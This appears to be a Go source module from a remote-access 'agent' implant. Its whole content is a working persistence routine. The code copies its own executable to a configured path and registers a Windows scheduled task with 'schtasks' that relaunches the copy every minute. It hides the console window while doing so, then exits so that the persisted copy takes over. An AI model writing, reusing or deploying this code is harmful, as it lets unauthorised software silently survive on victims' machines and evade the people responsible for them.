package modules

import (
	"agent/config"
	"fmt"
	"io"
	"log"
	"os"
	"os/exec"
	"syscall"
)

var conf = &config.Conf.Persistence

func moveAgentExecutable(currentAgentPath string) error {
	agentFile, err := os.Open(currentAgentPath)
	if err != nil {
		return fmt.Errorf("couldn't open agent file: %s", err)
	}
	copiedAgentFile, err := os.Create(conf.Path)
	if err != nil {
		agentFile.Close()
		return fmt.Errorf("couldn't open persistence path file: %s", err)
	}
	defer copiedAgentFile.Close()
	_, err = io.Copy(copiedAgentFile, agentFile)
	agentFile.Close()
	if err != nil {
		return fmt.Errorf("copying to persistence file failed: %s", err)
	}
	return nil
}

func Persist(currentAgentPath string) error {
	log.Printf("persisting")
	err := moveAgentExecutable(currentAgentPath)
	if err != nil {
		return err
	}
	cmd := exec.Command("schtasks", "/create", "/tn", conf.TaskName, "/tr", conf.Path, "/sc", "minute", "/f")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	out, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("failed to run persistence command: %s ; %v", out, err)
	}
	log.Printf("persisted. exiting, agent will restart shortly")
	os.Exit(0)
	return nil
}

func EnsurePersistence() error {
	log.Printf("ensuring persistence")
	currentAgentPath, err := os.Executable()
	if err != nil {
		return err
	}
	if currentAgentPath == conf.Path {
		log.Printf("agent is already persistent")
		return nil
	}
	return Persist(currentAgentPath)
}
